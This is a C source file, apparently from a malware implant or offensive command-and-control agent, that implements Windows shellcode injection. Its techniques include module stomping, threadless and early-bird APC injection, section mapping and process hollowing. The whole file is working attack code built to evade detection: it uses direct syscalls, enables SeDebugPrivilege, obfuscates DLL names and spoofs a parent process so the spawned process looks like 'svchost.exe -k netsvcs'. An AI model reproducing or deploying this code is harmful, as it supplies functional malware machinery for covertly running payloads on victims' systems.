/**
 * injection.c - Process Injection Techniques
 */
#include <windows.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <winternl.h>
#include <stdio.h>
#include "../../include/evasion.h"
#include "../../include/config.h"
#include "../../include/obfuscate.h"
#include "../../include/module_stomp.h"
#include "../../include/syscalls.h"

#ifndef NTSTATUS
typedef LONG NTSTATUS;
#endif

typedef struct _UNICODE_STRING_S {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING_S;

typedef struct _OBJECT_ATTRIBUTES_S {
    ULONG Length;
    HANDLE RootDirectory;
    PVOID ObjectName;
    ULONG Attributes;
    PVOID SecurityDescriptor;
    PVOID SecurityQualityOfService;
} OBJECT_ATTRIBUTES_S;

typedef NTSTATUS(NTAPI *pLdrLoadDll)(PWCHAR, ULONG, PVOID, PHANDLE);

DWORD find_injection_target(const wchar_t *process_name) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32W pe = {sizeof(pe)};
    DWORD target_pid = 0;

    if (Process32FirstW(snap, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, process_name) == 0) {
                HANDLE hProc = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE |
                                           PROCESS_VM_READ | PROCESS_QUERY_INFORMATION,
                                           FALSE, pe.th32ProcessID);
                if (hProc) {
                    target_pid = pe.th32ProcessID;
                    CloseHandle(hProc);
                    break;
                }
            }
        } while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap);
    return target_pid;
}

static BOOL inject_self_stomp(PBYTE shellcode, SIZE_T sc_size, const char *stomp_dll) {
    HMODULE hModule = LoadLibraryA(stomp_dll);
    if (!hModule) return FALSE;

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hModule;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((PBYTE)hModule + dos->e_lfanew);
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(nt);

    PVOID text_base = NULL;
    SIZE_T text_size = 0;
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (section[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
            text_base = (PVOID)((PBYTE)hModule + section[i].VirtualAddress);
            text_size = section[i].Misc.VirtualSize;
            break;
        }
    }
    if (!text_base || text_size < sc_size) {
        FreeLibrary(hModule);
        return FALSE;
    }

    DWORD old_protect;
    VirtualProtect(text_base, sc_size, PAGE_READWRITE, &old_protect);
    CopyMemory(text_base, shellcode, sc_size);
    VirtualProtect(text_base, sc_size, PAGE_EXECUTE_READ, &old_protect);

    HANDLE hThread = jager_create_thread(NULL, 0, (LPTHREAD_START_ROUTINE)text_base, NULL, 0, NULL);
    if (!hThread) {
        FreeLibrary(hModule);
        return FALSE;
    }
    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    return TRUE;
}

BOOL inject_module_stomp(HANDLE hProcess, PBYTE shellcode, SIZE_T sc_size, const char *stomp_dll) {
    HMODULE remote_mod = NULL;
    PVOID text_base = NULL;
    DWORD text_size = 0;
    wchar_t path[MAX_PATH];

    if (!shellcode || sc_size == 0 || !stomp_dll)
        return FALSE;

    if (!hProcess || hProcess == GetCurrentProcess())
        return inject_self_stomp(shellcode, sc_size, stomp_dll);

    enable_privilege(L"SeDebugPrivilege");

    if (!remote_find_module(hProcess, stomp_dll, &remote_mod)) {
        if (!module_stomp_system32_path(stomp_dll, path, MAX_PATH))
            return FALSE;
        if (!remote_load_dll(hProcess, path, &remote_mod))
            return FALSE;
    }

    if (!find_remote_text_section(hProcess, remote_mod, &text_base, &text_size) ||
        text_size < sc_size)
        return FALSE;

    if (!stomp_text_section(hProcess, text_base, text_size, shellcode, (DWORD)sc_size))
        return FALSE;

    HANDLE hThread = NULL;
    if (sys_NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess,
                             text_base, NULL, 0, 0, 0, 0, NULL) != 0)
        return FALSE;

    WaitForSingleObject(hThread, 30000);
    CloseHandle(hThread);
    return TRUE;
}

BOOL inject_module_stomp_pid(DWORD target_pid, PBYTE shellcode, SIZE_T sc_size,
                             const char *stomp_dll) {
    if (target_pid == 0) target_pid = find_injection_target(L"svchost.exe");
    if (target_pid == 0) return FALSE;

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, target_pid);
    if (!hProcess) return FALSE;

    BOOL ok = inject_module_stomp(hProcess, shellcode, sc_size, stomp_dll);
    CloseHandle(hProcess);
    return ok;
}

BOOL inject_spawn_to(PBYTE shellcode, SIZE_T sc_size, const wchar_t *spawn_path,
                     const char *stomp_dll) {
    const wchar_t *path = spawn_path;
    wchar_t default_path[MAX_PATH] = L"C:\\Windows\\System32\\svchost.exe";

    if (!path || !path[0])
        path = default_path;

#if INJECT_METHOD == 2
    {
        char hollow_msg[256] = {0};
        char narrow_path[MAX_PATH] = "C:\\Windows\\System32\\svchost.exe";
        DWORD parent_pid = find_suitable_parent_pid();
        WideCharToMultiByte(CP_ACP, 0, path, -1, narrow_path, MAX_PATH, NULL, NULL);
        return inject_process_hollow(narrow_path, shellcode, (DWORD)sc_size, parent_pid,
                                     hollow_msg, (int)sizeof(hollow_msg));
    }
#elif INJECT_METHOD == 3
    return inject_early_bird(path, shellcode, sc_size);
#else
    PROCESS_INFORMATION pi = {0};
    BOOL spawned = FALSE;
    DWORD parent_pid = find_suitable_parent_pid();

    if (parent_pid) {
        const wchar_t *spoofed = L"-k netsvcs";
        const wchar_t *real = L"";
        spawned = create_process_ppid_spoof_w(parent_pid, path, spoofed, real,
                                              TRUE, &pi);
    }

    if (!spawned) {
        STARTUPINFOW si = {sizeof(si)};
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;

        if (!CreateProcessW(path, NULL, NULL, NULL, FALSE,
                            CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
            return FALSE;
    }

    {
        BOOL ok = FALSE;
#if JAGER_USE_THREADLESS_INJECT
        PVOID trigger = NULL;
        ok = threadless_inject_handle(pi.hProcess, shellcode, (DWORD)sc_size, stomp_dll,
                                      5000, &trigger);
        if (ok && trigger)
            QueueUserAPC((PAPCFUNC)trigger, pi.hThread, 0);
#else
        ok = inject_module_stomp(pi.hProcess, shellcode, sc_size, stomp_dll);
#endif
        if (ok)
            ResumeThread(pi.hThread);
        else
            TerminateProcess(pi.hProcess, 0);

        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return ok;
    }
#endif
}

BOOL inject_threadless(HANDLE hProcess, PBYTE shellcode, SIZE_T sc_size) {
#if JAGER_USE_THREADLESS_INJECT
    return threadless_inject_handle(hProcess, shellcode, (DWORD)sc_size, OBF(DLL_STOMP_TARGET), 5000, NULL);
#else
    PVOID remote_base = NULL;
    SIZE_T alloc_size = sc_size;

    if (sys_NtAllocateVirtualMemory(hProcess, &remote_base, &alloc_size,
                                    MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE) != 0)
        return FALSE;

    SIZE_T bytes_written = 0;
    if (sys_NtWriteVirtualMemory(hProcess, remote_base, shellcode, sc_size, &bytes_written) != 0)
        return FALSE;

    ULONG old_protect = 0;
    SIZE_T protect_size = sc_size;
    PVOID protect_base = remote_base;
    sys_NtProtectVirtualMemory(hProcess, &protect_base, &protect_size,
                             PAGE_EXECUTE_READ, &old_protect);

    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (snap == INVALID_HANDLE_VALUE) return FALSE;

    THREADENTRY32 te = {sizeof(te)};
    DWORD pid = GetProcessId(hProcess);
    BOOL queued = FALSE;

    if (Thread32First(snap, &te)) {
        do {
            if (te.th32OwnerProcessID == pid) {
                HANDLE hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, te.th32ThreadID);
                if (hThread) {
                    if (sys_NtQueueApcThread(hThread, remote_base, NULL, NULL, NULL) == 0)
                        queued = TRUE;
                    CloseHandle(hThread);
                    if (queued) break;
                }
            }
        } while (Thread32Next(snap, &te));
    }
    CloseHandle(snap);
    return queued;
#endif
}

BOOL inject_map_view(HANDLE hProcess, PBYTE shellcode, SIZE_T sc_size) {
    HANDLE hSection = NULL;
    LARGE_INTEGER section_size;
    section_size.QuadPart = (LONGLONG)sc_size;

    if (sys_NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, &section_size,
                            PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL) != 0)
        return FALSE;

    PVOID local_base = NULL;
    SIZE_T view_size = 0;
    if (sys_NtMapViewOfSection(hSection, GetCurrentProcess(), &local_base, 0, 0,
                               NULL, &view_size, 1, 0, PAGE_READWRITE) != 0) {
        CloseHandle(hSection);
        return FALSE;
    }

    PVOID remote_base = NULL;
    view_size = 0;
    if (sys_NtMapViewOfSection(hSection, hProcess, &remote_base, 0, 0,
                               NULL, &view_size, 1, 0, PAGE_EXECUTE_READ) != 0) {
        sys_NtUnmapViewOfSection(GetCurrentProcess(), local_base);
        CloseHandle(hSection);
        return FALSE;
    }

    CopyMemory(local_base, shellcode, sc_size);

    HANDLE hThread = NULL;
    NTSTATUS status = sys_NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess,
                                           remote_base, NULL, 0, 0, 0, 0, NULL);
    if (hThread) CloseHandle(hThread);
    sys_NtUnmapViewOfSection(GetCurrentProcess(), local_base);
    CloseHandle(hSection);
    return status == 0;
}

BOOL inject_early_bird(const wchar_t *spawn_path, PBYTE shellcode, SIZE_T sc_size) {
    STARTUPINFOW si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);

    if (!CreateProcessW(spawn_path, NULL, NULL, NULL, FALSE,
                        CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
        return FALSE;

    PVOID remote_base = NULL;
    SIZE_T alloc_sz = sc_size;
    if (sys_NtAllocateVirtualMemory(pi.hProcess, &remote_base, &alloc_sz,
                                    MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE) != 0) {
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return FALSE;
    }

    SIZE_T written = 0;
    sys_NtWriteVirtualMemory(pi.hProcess, remote_base, shellcode, sc_size, &written);

    ULONG old = 0;
    SIZE_T psz = sc_size;
    PVOID pbase = remote_base;
    sys_NtProtectVirtualMemory(pi.hProcess, &pbase, &psz, PAGE_EXECUTE_READ, &old);

    QueueUserAPC((PAPCFUNC)remote_base, pi.hThread, 0);
    ResumeThread(pi.hThread);

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return TRUE;
}

INJECTION_METHOD select_injection_method(DWORD target_pid) {
#if INJECT_METHOD == 2
    (void)target_pid;
    return INJECT_HOLLOW;
#elif INJECT_METHOD == 3
    (void)target_pid;
    return INJECT_APC;
#else
    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, target_pid);
    if (hProc) {
        CloseHandle(hProc);
        return INJECT_MAP_VIEW;
    }
    hProc = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD,
                        FALSE, target_pid);
    if (hProc) {
        CloseHandle(hProc);
        return INJECT_THREADLESS;
    }
    return INJECT_EARLY_BIRD;
#endif
}

BOOL inject_shellcode(DWORD target_pid, BYTE *payload, DWORD payload_size,
                      char *out, int out_size) {
    if (!payload || payload_size == 0) {
        if (out && out_size > 0)
            _snprintf(out, out_size, "empty payload");
        return FALSE;
    }
    if (target_pid == 0) {
        if (out && out_size > 0)
            _snprintf(out, out_size, "invalid PID");
        return FALSE;
    }

    BOOL ok = inject_module_stomp_pid(target_pid, payload, payload_size, OBF(DLL_STOMP_TARGET));
    if (!ok)
        ok = threadless_inject(target_pid, payload, payload_size, OBF(DLL_STOMP_TARGET), 5000);

    if (out && out_size > 0) {
        if (ok)
            _snprintf(out, out_size, "Injected %lu bytes into PID %lu",
                      (unsigned long)payload_size, (unsigned long)target_pid);
        else
            _snprintf(out, out_size, "Injection into PID %lu failed",
                      (unsigned long)target_pid);
    }
    return ok;
}
